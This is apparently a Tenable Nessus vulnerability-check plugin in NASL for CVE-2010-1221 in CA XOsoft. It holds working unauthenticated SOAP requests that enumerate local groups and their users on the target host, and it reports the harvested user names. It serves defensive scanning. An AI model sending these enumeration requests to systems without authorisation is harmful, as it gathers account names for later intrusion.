#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(45502);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2016/10/07 13:30:47 $");

  script_cve_id("CVE-2010-1221");
  script_bugtraq_id(39244);
  script_osvdb_id(63613);
  script_xref(name:"Secunia", value:"39337");

  script_name(english:"Computer Associates XOsoft SOAP Request Username Enumeration (CA20100406)");
  script_summary(english:"Attempts to list local users on the remote system");

  script_set_attribute(attribute:"synopsis", value:
"The remote host has a web application that is affected by an
information disclosure vulnerability." );
  script_set_attribute(attribute:"description", value:
"The remote web server is a component of XOsoft, a product from
Computer Associates for combined business continuity and disaster
recovery. 

The installed version of this service does not require authentication
when handling SOAP requests to enumerate user names.  An
unauthenticated, remote attacker can leverage this issue to enumerate
local users on the remote system. 

The installed version is reportedly also affected by other
vulnerabilities, including one that may allow arbitrary code execution
on the remote system.  Nessus however has not checked for existence of
such vulnerabilities.");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?cc6c8832");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2010/Apr/82");
  script_set_attribute(attribute:"solution", value:
"Apply the appropriate patch referenced in the vendor advisory." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/04/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/04/06");
  script_set_attribute(attribute:"plugin_publication_date",value:"2010/04/13");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/ASP");
  script_require_ports("Services/www", 8088);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:8088);

banner = get_http_banner(port:port);
if (!banner) exit(1, "Unable to get banner from web server on port "+port+".");
if(!egrep(pattern:"^Server:.*Microsoft-HTTPAPI/",string:banner))
  exit(0,"The banner from the web server on port "+ port + " does not appear to be from XOsoft."); 

url = "/ws_man/xosoapapi.asmx";
res = http_send_recv3(method:"GET", item:url, port:port,exit_on_fail:1);

info = NULL;

if (">xosoapapi_c<" >< res[2])
{
  # First get a list of groups to check.
  postdata = 
    '<?xml version="1.0" encoding="utf-8"?>' + '\r\n' +
    '<soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">' + '\r\n' +
    '<soap12:Body>' + '\r\n' +
    '<get_local_group_names xmlns="http://ca.com/" />' + '\r\n' +
    '</soap12:Body>' + '\r\n' +
    '</soap12:Envelope>' + '\r\n';
  
  res = http_send_recv3(
    method:"POST",
    item:url,
    port:port,
    add_headers: make_array("Content-Type", "application/soap+xml; charset=utf-8",
    "Content-Length",strlen(postdata)),
    data:postdata,
    exit_on_fail:1
    );
 

  if("><get_local_group_namesResult>" >< res[2] && 'group name=' >< res[2])
  {
    groups = make_list();
    foreach line (split(res[2]))
    {
      matches = eregmatch(pattern:'group name=\"(.+)\"/&gt;',string:line) ;
      if(matches)
        groups = make_list(groups,matches[1]);
    }

    # If we could not get the list of local group names
    # Try few groups that should typically exist.

    if(max_index(groups) == 0)
      groups = make_list("Administrators", "Users", "Guests");

    foreach group (groups)
    {
      postdata2 = 
        '<?xml version="1.0" encoding="utf-8"?>' + '\r\n' +
        '<soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">' + '\r\n' +
        '<soap12:Body>' + '\r\n' +
        '  <get_group_users xmlns="http://ca.com/">' + '\r\n' +
        '    <group_name>' + group + '</group_name>' + '\r\n' +
        '  </get_group_users>' + '\r\n' +
        '</soap12:Body>' + '\r\n' +
        '</soap12:Envelope>' + '\r\n' ;

       res = http_send_recv3(
         method:"POST", 
         item:url, 
         port:port,
         add_headers: make_array("Content-Type", "application/soap+xml; charset=utf-8",
         "Content-Length",strlen(postdata2)),
         data:postdata2,
         exit_on_fail:1
       );
  
       if("><get_group_usersResult>" >< res[2] && "xo_user user=" >< res[2])
       {
         users = NULL;
         foreach line (split(res[2]))
         {
           matches = eregmatch(pattern:'xo_user user=\"(.+)\"/&gt;',string:line) ;
           if(matches)
             users += " + " + matches[1] + '\n';
         }
         if(!isnull(users))
         {  
           info +=  '\n' + group + " group : " + '\n\n' + users ;
           req = http_last_sent_request();
         }
       } 
       # Stop...if we found users and thorough_tests were not enabled.
       if(!isnull(info) && !thorough_tests)
       break;
     }
  }
}
else 
  exit(1, "The web application on port "+ port + " does not appear to be XOsoft.");

if(!isnull(info))
{
  if(report_verbosity > 0 )
  { 
    report = '\n' +
         'Nessus was able to verify the issue using the following request : \n' +
         '\n' +
         crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
         req + '\n' +
         crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';

     if(report_verbosity > 1)
     {
       report +=
         'Here is the list of users that Nessus was able to enumerate :\n' +
         info + '\n' ; 
       
      if(!thorough_tests)
        report +=
          '\nNote that only a partial list of users were enumerated since\n' +
          "'thorough_tests' was disabled for this scan." + '\n';
     } 
    security_warning(port:port, extra:report);
  }
  else security_warning(port);

  exit(0);
}
else exit(0, "The version of XOsoft on port "+ port + " is not affected.");
